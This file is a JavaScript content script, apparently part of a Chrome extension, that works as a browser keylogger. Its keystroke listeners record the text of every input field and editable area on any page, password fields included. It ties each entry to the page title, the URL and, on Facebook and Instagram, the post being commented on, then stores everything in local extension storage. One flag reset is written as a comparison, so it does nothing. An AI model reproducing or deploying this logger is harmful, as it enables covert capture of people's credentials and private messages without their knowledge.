/* Randoms */
if (!document.title) {
    document.title = document.URL;
}

/* Keylog Saving */
var time = new Date().getTime();
var data = {};
var shouldSave = false;
var lastLog = time;
var num = 0;
var flag = [];

document.addEventListener('keydown', function(e){
    e = e || window.event;
    var class_arr = e.target.className.split(' ');
    if((typeof e.target.value !== 'undefined' && (e.target.value == "" || e.target.value=="\n")) || (typeof e.target.value === 'undefined' && (e.target.innerText == "" || e.target.innerText == "\n"))){
        for(var i =0; i<class_arr.length; i++){
            if(class_arr[i].includes("keylog_number")){
                console.log("flag",flag[class_arr[i].split("keylog_number")[1]]);
                if(flag[class_arr[i].split("keylog_number")[1]] == 1){
                    flag[class_arr[i].split("keylog_number")[1]] == 0;
                    return;
                }
                e.target.classList.remove(class_arr[i]);
            }
        }
    }
})

/* Keylib */
// Alphanumeric
document.addEventListener('keyup', function (e) {
    e = e || window.event;
    var class_arr = e.target.className.split(' ');
    var tmp_num = -1;
    for(var i =0; i<class_arr.length; i++){
        if(class_arr[i].includes("keylog_number")){
            tmp_num = class_arr[i].split("keylog_number")[1];
        }
    }
    if(tmp_num == -1){
        e.target.classList.add("keylog_number"+num);
        tmp_num = num;
        num++;
    }
    var post_url = null;

    if(window.location.href.includes("https://www.facebook.com/") && e.target.closest("form").parentNode.closest("form").ft_ent_identifier.value){
        post_url = "https://www.facebook.com/"+e.target.closest("form").parentNode.closest("form").ft_ent_identifier.value;
    }

    if(window.location.href.includes("https://www.instagram.com/") && e.target.closest("article").getElementsByClassName("c-Yi7")[0].href){
        post_url = e.target.closest("article").getElementsByClassName("c-Yi7")[0].href;
    }

    if(typeof e.target.value !== 'undefined'){
        if((e.target.value == "" || e.target.value == "\n")&& (e.keyCode == '8' || e.keyCode == '46')) flag[tmp_num] = 1;
        log(e.target.value, tmp_num, post_url);
    }
    else if(e.target.tagName == 'DIV'){
        if((e.target.innerText == "" || e.target.innerText == "\n")&& (e.keyCode == '8' || e.keyCode == '46')) flag[tmp_num] = 1;
        log(e.target.innerText, tmp_num, post_url);
    }
    
});

// Key'ed on JS timestamp
function log(input, input_num, post_url) {
    var now = new Date().getTime();
    if (input == '' || input == '\n') return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
    if(typeof data[time] === 'undefined') data[time] = {};
    data[time][input_num] = document.title + "^~^" + document.URL + "^~^" + input;
    if(post_url != null){
        console.log(post_url);
        data[time][input_num] = document.title + "^~^" + post_url+"^~^"+input;
    }
    shouldSave = true;
    lastLog = now;
    console.log("[Dr.pepper]Logged : ", input);
    save();
}


/* Save data */
function save() {
    if (shouldSave) {
        chrome.storage.local.set(data, function() { console.log("Saved", data); shouldSave = false; });
    }
}

function autoDelete() {
    chrome.storage.sync.get({autoDelete: 1337}, function(settings) {
        // Make sure to sync with delete code from viewer.js
        var endDate = (new Date()).getTime() - (settings.autoDelete * 24 * 60 * 60 * 1000);
        chrome.storage.local.get(function(logs) {
            var toDelete = [];
            for (var key in logs) {
                if (key < endDate || isNaN(key) || key < 10000) { // Restrict by time and remove invalid chars 
                  toDelete.push(key);
                }
            }
            chrome.storage.local.remove(toDelete, function() {
                console.log(toDelete.length + " entries deleted");
            });
        });
    });
}

// Save data on window close
window.onbeforeunload = function() {
    save();
    if (Math.random() < 0.2) // Don't clear every unload
        autoDelete();
}
